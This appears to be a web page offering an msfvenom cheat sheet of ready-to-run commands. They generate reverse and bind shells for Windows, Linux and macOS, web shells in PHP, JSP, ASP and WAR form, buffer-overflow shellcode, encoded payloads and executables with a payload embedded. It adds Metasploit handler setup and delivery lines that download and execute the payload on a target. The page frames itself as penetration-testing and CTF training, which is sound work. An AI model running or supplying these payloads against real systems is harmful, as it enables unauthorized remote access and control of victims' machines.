
   Need a reverse shell? Msfvenom generates it in one
   command. Windows executable, Linux ELF, PHP web shell, or
   raw shellcode for your buffer overflow exploit: msfvenom
   handles them all.

   This msfvenom cheat sheet gives you copy-paste commands
   for every payload scenario in 2026. No fluff, just
   working one-liners you can use immediately.
   
🚀 Top 15 Msfvenom Commands (Copy-Paste Ready)

   The most common msfvenom commands for quick reference.
   Copy, paste, replace 10.10.10.10 with your IP and 4444
   with your port.
# Windows Meterpreter (64-bit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10
LPORT=4444 -f exe -o shell.exe

# Windows Meterpreter (32-bit)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -f exe -o shell.exe

# Linux Meterpreter (64-bit)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LP
ORT=4444 -f elf -o shell

# Linux shell (64-bit)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=44
44 -f elf -o shell

# macOS reverse shell
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f macho -o shell

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=44
44 -f raw -o shell.php

# JSP web shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=444
4 -f raw -o shell.jsp

# WAR file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=444
4 -f war -o shell.war

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -f asp -o shell.asp

# ASPX web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -f aspx -o shell.aspx

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT
=4444 -f raw -o shell.py

# Bash one-liner
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f
raw -o shell.sh

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10
LPORT=4444 -f psh -o shell.ps1

# Shellcode (C format)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10
LPORT=4444 -f c -b "\x00"

# Encoded payload (bad char removal, basic obfuscation)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10
LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

     Target                  Payload               Format
   Windows x64 windows/x64/meterpreter/reverse_tcp exe
   Windows x86 windows/meterpreter/reverse_tcp     exe
   Linux x64   linux/x64/meterpreter/reverse_tcp   elf
   macOS       osx/x64/shell_reverse_tcp           macho
   PHP         php/meterpreter/reverse_tcp         raw
   Java/JSP    java/jsp_shell_reverse_tcp          war
   Bash        cmd/unix/reverse_bash               raw
   PowerShell  windows/x64/meterpreter/reverse_tcp psh

📑 Quick Navigation

     * What is Msfvenom?
     * Basic Syntax
     * Listing Payloads
     * Windows Payloads
     * Linux Payloads
     * macOS Payloads
     * Web Payloads
     * Shellcode Generation
     * Encoders & Encoding
     * Metasploit Handlers
     * Common Scenarios
     * Quick Reference
     * Troubleshooting
     * Practice Labs

🔧 What is Msfvenom?

   Msfvenom is the Metasploit Framework's payload generator.
   It replaced the older msfpayload and msfencode tools,
   combining payload generation and encoding in one utility.
   Reverse Shells

   Target connects back to your machine
   Bind Shells

   Open a port on target, you connect to it
   Meterpreter

   Advanced shell with post-exploitation features
   Shellcode

   Raw bytes for buffer overflow exploits

   Msfvenom generates payloads in formats for every
   scenario: .exe for Windows, .elf for Linux, .php for web
   apps, and raw shellcode for exploit development. It
   integrates with Metasploit's multi/handler to catch
   incoming connections.

   Pro Tip: Know your target's OS and architecture before
   generating payloads. A 64-bit payload won't run on a
   32-bit system.

⚙️ Basic Msfvenom Syntax

   Understanding msfvenom's syntax is crucial for effective
   payload generation. The basic command structure follows a
   consistent pattern that you'll use for every payload.
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <outp
ut>

Essential Flags

   Flag Description Example
   -p Payload to use -p windows/meterpreter/reverse_tcp
   -f Output format -f exe
   -o Output file -o shell.exe
   -e Encoder to use -e x86/shikata_ga_nai
   -i Encoding iterations -i 5
   -b Bad characters to avoid -b "\x00\x0a\x0d"
   -a Architecture -a x64
   --platform Target platform --platform windows

Payload Variables

   Variable        Description            Used For
   LHOST    Local host (your IP)       Reverse shells
   LPORT    Local port (your listener) Reverse shells
   RHOST    Remote host (target IP)    Bind shells
   RPORT    Remote port (target port)  Bind shells

🔍 Listing Payloads, Formats, and Encoders

   Before generating payloads, you need to know what's
   available. These commands help you explore msfvenom's
   capabilities and find the right payload for your
   scenario.

Discovery Commands

          Command                Description
   msfvenom -l payloads  List all available payloads
   msfvenom -l formats   List all output formats
   msfvenom -l encoders  List all encoders
   msfvenom -l archs     List supported architectures
   msfvenom -l platforms List supported platforms
   msfvenom -l encrypt   List encryption options

Filtering Payloads

# List Windows payloads only
msfvenom -l payloads | grep windows

# List Linux reverse shell payloads
msfvenom -l payloads | grep linux | grep reverse

# List PHP payloads
msfvenom -l payloads | grep php

# Show payload options
msfvenom -p windows/meterpreter/reverse_tcp --list-options

   Pro Tip: Use --list-options to see all configurable
   options for a specific payload. This shows required and
   optional variables, helping you customize payloads for
   specific scenarios.

🪟 Windows Payloads

   Windows is the most common target in penetration testing.
   Generate executables, DLLs, PowerShell scripts, and MSI
   packages for Windows exploitation.

   💡 Quick Pick: For most Windows targets, use
   windows/x64/meterpreter/reverse_tcp with format exe. It
   works on Windows 7+ and gives you full Meterpreter
   capabilities.

   Staged vs Stageless: Payload names with a / (like
   meterpreter/reverse_tcp) are staged and require a handler
   to send the second stage. Payload names with an _ (like
   meterpreter_reverse_tcp) are stageless and contain
   everything in one file. Use stageless when network
   restrictions may block the stage download.

Reverse Shell Payloads

# Windows reverse TCP shell (32-bit)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f exe -o shell.exe

# Windows reverse TCP shell (64-bit)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=
4444 -f exe -o shell64.exe

# Meterpreter reverse TCP (32-bit)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -f exe -o meterpreter.exe

# Meterpreter reverse TCP (64-bit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10
LPORT=4444 -f exe -o meterpreter64.exe

# Meterpreter reverse HTTPS (encrypted, often allowed outbound)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1
0 LPORT=443 -f exe -o https_shell.exe

Bind Shell Payloads

# Windows bind TCP shell
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell
.exe

# Meterpreter bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind
_meterpreter.exe

Alternative Windows Formats

   Format Flag Use Case
   Executable -f exe Standard Windows executable
   DLL -f dll DLL hijacking attacks
   MSI -f msi Windows installer package
   PowerShell -f psh PowerShell script
   PowerShell Command -f psh-cmd One-liner for command
   injection

PowerShell Payloads

# PowerShell script payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10
LPORT=4444 -f psh -o shell.ps1

# PowerShell one-liner (for command injection)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10
LPORT=4444 -f psh-cmd

# Base64 encoded PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10
LPORT=4444 -f psh-reflection

🐧 Linux Payloads

   Linux payloads generate ELF binaries for Unix-based
   systems. Works on most distributions and can target
   embedded devices with ARM/MIPS architectures.

   💡 Quick Pick: For CTFs and most Linux targets, use
   linux/x64/shell_reverse_tcp with format elf. Simple,
   reliable, and works without Meterpreter dependencies.

Reverse Shell Payloads

# Linux reverse TCP shell (32-bit)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=44
44 -f elf -o shell

# Linux reverse TCP shell (64-bit)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=44
44 -f elf -o shell64

# Meterpreter reverse TCP (32-bit)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LP
ORT=4444 -f elf -o meterpreter

# Meterpreter reverse TCP (64-bit)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LP
ORT=4444 -f elf -o meterpreter64

Bind Shell Payloads

# Linux bind TCP shell
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf -o bind_she
ll

# Meterpreter bind TCP
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4444 -f elf -o bi
nd_meterpreter

ARM Payloads (IoT Devices)

# ARM reverse shell (Raspberry Pi, routers)
msfvenom -p linux/armle/shell_reverse_tcp LHOST=10.10.10.10 LPORT=
4444 -f elf -o arm_shell

# MIPS reverse shell (embedded devices)
msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=10.10.10.10 LPORT
=4444 -f elf -o mips_shell

   Pro Tip: After generating a Linux payload, make it
   executable with chmod +x. Transfer it to the target using
   wget, curl, or a Python HTTP server, then execute it to
   establish your connection.

🍎 macOS Payloads

   macOS payloads generate Mach-O binaries for Apple
   systems. These work on Intel-based Macs and can be useful
   when targeting developer workstations or macOS servers.

Reverse Shell Payloads

# macOS reverse TCP shell (64-bit Intel)
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f macho -o shell

# macOS Meterpreter reverse TCP
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -f macho -o meterpreter

# macOS reverse HTTPS (often allowed outbound)
msfvenom -p osx/x64/meterpreter/reverse_https LHOST=10.10.10.10 LP
ORT=443 -f macho -o https_shell

Bind Shell Payloads

# macOS bind TCP shell
msfvenom -p osx/x64/shell_bind_tcp LPORT=4444 -f macho -o bind_she
ll

# macOS Meterpreter bind TCP
msfvenom -p osx/x64/meterpreter/bind_tcp LPORT=4444 -f macho -o bi
nd_meterpreter

   macOS Notes: Modern macOS includes Gatekeeper and code
   signing requirements. Unsigned binaries will trigger
   security warnings. For authorized testing on systems you
   control, you can remove the quarantine flag with xattr -d
   com.apple.quarantine shell or use alternative delivery
   methods like Python or Bash payloads. Apple Silicon
   (M1/M2/M3) Macs can run x64 payloads via Rosetta 2.

🌐 Web Application Payloads

   Essential for file upload exploits, command injection,
   and web app attacks. Generate PHP, JSP, ASP, Python,
   Bash, and NodeJS payloads.

   💡 Quick Pick: For PHP file upload vulnerabilities, use
   php/reverse_php with format raw. Remember to add <?php
   tag manually!

PHP Payloads

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw -o
 shell.php

# PHP Meterpreter reverse TCP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=44
44 -f raw -o meterpreter.php

# PHP bind shell
msfvenom -p php/bind_php LPORT=4444 -f raw -o bind_shell.php

JSP Payloads (Java)

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=444
4 -f raw -o shell.jsp

# JSP bind shell
msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f raw -o bind_shel
l.jsp

# WAR file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=444
4 -f war -o shell.war

ASP/ASPX Payloads

# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f asp -o shell.asp

# ASPX reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f aspx -o shell.aspx

# ASPX Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -f aspx -o meterpreter.aspx

Python Payloads

# Python reverse shell
msfvenom -p python/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
-f raw -o shell.py

# Python Meterpreter
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT
=4444 -f raw -o meterpreter.py

Bash and Shell Payloads

# Bash reverse shell (useful for command injection)
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f
raw -o shell.sh

# Netcat reverse shell
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.10.10 LPORT=4444 -
f raw

# Perl reverse shell
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4444 -f
raw -o shell.pl

# Ruby reverse shell
msfvenom -p cmd/unix/reverse_ruby LHOST=10.10.10.10 LPORT=4444 -f
raw -o shell.rb

NodeJS Payloads

# NodeJS reverse shell
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
-f raw -o shell.js

# NodeJS bind shell
msfvenom -p nodejs/shell_bind_tcp LPORT=4444 -f raw -o bind_shell.
js

   PHP Payload Gotcha: Msfvenom PHP payloads do NOT include
   the opening <?php tag. You must add it manually: echo
   '<?php ' | cat - shell.php > shell_final.php. Without
   this, the payload executes as plain text instead of PHP
   code.

   Learn to exploit file upload vulnerabilities and deliver
   web payloads in our Web Application Security Course.
   Practice PHP shell uploads in the File Upload Bypass
   Challenge, or test SQL injection payloads in the SQL
   Injection Test Lab.

💉 Shellcode Generation

   Shellcode is raw machine code used in buffer overflow
   exploits and custom malware development. Msfvenom
   generates shellcode in multiple formats for different
   programming languages.

Common Shellcode Formats

     Format     Flag           Use Case
   Raw bytes  -f raw    Direct binary shellcode
   C array    -f c      C exploit development
   Python     -f python Python exploit scripts
   Ruby       -f ruby   Ruby exploit scripts
   Hex        -f hex    Hexadecimal string
   JavaScript -f js_le  Browser exploits

Shellcode Examples

# C shellcode for buffer overflow
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f c -b "\x00"

# Python shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=44
44 -f python -b "\x00\x0a\x0d"

# Raw shellcode (for manual injection)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f raw -o shellcode.bin

# Hex format
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=44
44 -f hex

Payload Size and Buffer Calculations

   Payload size matters for buffer overflow exploits. Your
   shellcode must fit in the available buffer space.
   Msfvenom displays size information during generation.
# Check payload size before generating
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f c -b "\x00" 2>&1 | grep "Payload size"

# Typical sizes (approximate):
# windows/shell_reverse_tcp:     ~324 bytes
# windows/meterpreter/reverse_tcp: ~354 bytes (staged, stager only
)
# linux/x86/shell_reverse_tcp:   ~68 bytes
# cmd/unix/reverse_bash:         ~60 bytes

   Size Tip: Staged payloads are smaller because the stager
   downloads the full payload. If buffer space is limited,
   use staged payloads. If you need reliability over size,
   use stageless. Add NOP sled with -n 16 for alignment.

Avoiding Bad Characters

   Buffer overflow exploits often cannot contain certain
   bytes (null bytes, newlines, etc.). Use the -b flag to
   exclude problematic characters from your shellcode.
# Avoid null byte and common bad chars
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f c -b "\x00\x0a\x0d\x20"

# Generate with NOP sled for alignment
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -f c -b "\x00" -n 16

🛡️ Encoders and Payload Encoding

   Encoders transform payloads to remove problematic
   characters and change their byte signature. This is
   primarily useful for removing bad characters in buffer
   overflow exploits and reducing trivial signature matches
   during authorized testing.

   Reality Check: Modern security products use behavioral
   analysis, sandboxing, and machine learning. Encoding
   alone does not defeat these defenses. The primary
   legitimate use of encoding is removing bad characters
   from shellcode for exploit development.

Popular Encoders

   Encoder Rating Description
   x86/shikata_ga_nai Excellent Polymorphic XOR encoder
   (most popular)
   x64/xor Normal 64-bit XOR encoder
   x86/fnstenv_mov Normal Variable-length fnstenv/mov
   encoder
   cmd/powershell_base64 Excellent Base64 PowerShell encoder

Encoding Commands

# Single encoding iteration
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -e x86/shikata_ga_nai -i 10 -f exe -o multi_encoded.exe

# Chain multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -e x86/shikata_ga_nai -i 5 -e x86/countdown -i 3 -f exe -o
chain_encoded.exe

Executable Templates

   Embed payloads into existing executables using the -x
   flag. The original executable's functionality is
   preserved alongside the payload. This is useful for
   understanding how payloads can be packaged during
   authorized assessments.
# Embed payload into existing executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPOR
T=4444 -x /path/to/template.exe -k -f exe -o output.exe

   Detection Reality: Modern security products analyze
   behavior, not just file signatures. Encoding and
   templates are detected by behavioral analysis,
   sandboxing, and machine learning. These techniques are
   educational for understanding detection mechanisms, not
   for defeating security controls.

📡 Setting Up Metasploit Handlers

   Your payload needs somewhere to call home. The
   multi/handler module catches incoming connections from
   msfvenom payloads.
   1. Generate
   msfvenom payload
   →
   2. Start
   multi/handler
   →
   3. Deliver
   payload to target
   →
   4. Shell!
   connection received

Basic Handler Setup

# Start Metasploit console
msfconsole

# Configure handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run

One-Liner Handler

# Quick handler without interactive console
msfconsole -x "use exploit/multi/handler; set payload windows/mete
rpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"

Handler Resource File

   Create a resource file for frequently used handler
   configurations:
# Save as handler.rc
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
set ExitOnSession false
set EnableStageEncoding true
run -j

# Run with: msfconsole -r handler.rc

            Option                       Description
   ExitOnSession false      Keep handler running after connection
   run -j                   Run as background job
   EnableStageEncoding true Encrypt stage transmission

🎯 Common Penetration Testing Scenarios

   These ready-to-use command combinations cover the most
   frequent situations you'll encounter during penetration
   tests and CTF competitions.

Windows Target (Internal Network)

# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10
LPORT=4444 -f exe -o shell.exe

# Transfer to target (from attacker machine)
python3 -m http.server 80

# On target: powershell -c "(New-Object Net.WebClient).DownloadFil
e('http://10.10.10.10/shell.exe','shell.exe')"

# Start handler
msfconsole -x "use multi/handler; set payload windows/x64/meterpre
ter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"

Linux Target (CTF Style)

# Generate payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=44
44 -f elf -o shell

# Start listener (netcat is simpler for basic shells)
nc -lvnp 4444

# Transfer and execute on target
# wget http://10.10.10.10/shell && chmod +x shell && ./shell

Web Shell Upload

# PHP shell for file upload vulnerability
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=44
44 -f raw -o shell.php

# Add PHP tags (msfvenom output needs them)
echo '<?php ' | cat - shell.php > shell_final.php

# JSP for Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=444
4 -f war -o shell.war

Buffer Overflow Exploit

# Generate shellcode avoiding null bytes
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -b "\x00" -f python -v shellcode

# With NOP sled
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444
 -b "\x00" -n 16 -f python -v shellcode

   Practice remote code execution scenarios in our RCE
   Playground, designed specifically for learning payload
   delivery and exploitation techniques.

📋 Quick Reference Card

   Essential msfvenom commands for quick reference. Bookmark
   this section.

🎯 Most Used Commands

   WIN msfvenom -p windows/x64/meterpreter/reverse_tcp
   LHOST=IP LPORT=PORT -f exe -o shell.exe
   LNX msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP
   LPORT=PORT -f elf -o shell
   PHP msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f
   raw -o shell.php
   JSP msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP
   LPORT=PORT -f war -o shell.war
   BOF msfvenom -p windows/shell_reverse_tcp LHOST=IP
   LPORT=PORT -f c -b "\x00"

⚡ Key Flags

   -p
   Payload
   -f
   Format
   -o
   Output file
   -e
   Encoder
   -b
   Bad chars
   -i
   Iterations
   -l
   List options
   -a
   Architecture

Handler Payload Mismatch

   Problem: Handler receives connection but session dies
   immediately.

   Fix: The payload in your handler MUST exactly match the
   payload used in msfvenom. windows/meterpreter/reverse_tcp
   (staged) is NOT the same as
   windows/meterpreter_reverse_tcp (stageless). Copy-paste
   the exact payload string.

Choosing the Right LHOST

   Scenario Use This Interface
   VPN (HTB, THM, labs) tun0 - your VPN tunnel IP
   Local network eth0 or wlan0 - your local IP
   Behind NAT (internet target) Your public IP + port
   forwarding, or use bind shell
   Docker/VM Host's IP that target can reach, not container
   IP
# Find your interface IPs
ip addr show | grep "inet "
# or
ifconfig | grep "inet "

Payload Not Executing

     * Linux ELF not running: Did you chmod +x shell?
     * PHP shows code instead of executing: Add <?php tag at
       the start
     * Windows blocks execution: Security software detected
       it; expected in protected environments
     * macOS quarantine: Run xattr -d com.apple.quarantine
       shell
     * Architecture mismatch: 32-bit payload on 64-bit
       system usually works; 64-bit on 32-bit fails

Connection Not Received

     * Check firewall: Is your listener port open? sudo ufw
       allow 4444/tcp
     * Verify handler is running: Check with jobs in
       msfconsole
     * Network routing: Can target reach your LHOST? Test
       with ping if possible
     * Wrong port: Verify LPORT matches between payload and
       handler

🎮 Practice Your Payload Skills

   Reading this msfvenom cheat sheet gives you the commands.
   Practice makes them second nature. The difference between
   knowing payload syntax and successfully exploiting a
   target comes down to hands-on experience.

What is msfvenom used for?

   Msfvenom is a payload generator in the Metasploit
   Framework. Security professionals use it to create
   reverse shells, bind shells, and shellcode for authorized
   penetration testing. It generates payloads in various
   formats including executables, scripts, and raw
   shellcode.

What is the difference between a staged and stageless payload?

   Staged payloads (like windows/meterpreter/reverse_tcp)
   send a small initial stager that downloads the full
   payload. Stageless payloads (like
   windows/meterpreter_reverse_tcp, note the underscore)
   contain everything in one package. Staged payloads are
   smaller but require a stable connection. Stageless
   payloads are larger but more reliable.

What is encoding used for?

   Encoding transforms payload bytes to remove problematic
   characters (like null bytes) that would break buffer
   overflow exploits. Modern security products use
   behavioral analysis, sandboxing, and machine learning
   that detect malicious activity regardless of encoding.
   The primary legitimate use is bad character removal for
   exploit development.

How do I know which payload to use?

   Choose based on target OS (Windows/Linux), architecture
   (x86/x64), and network conditions. For internal networks,
   use reverse_tcp. For internet-facing targets behind NAT,
   bind shells may work better. When HTTPS is allowed
   outbound, reverse_https often succeeds. Use Meterpreter
   for full post-exploitation features, or basic shell
   payloads for simplicity.

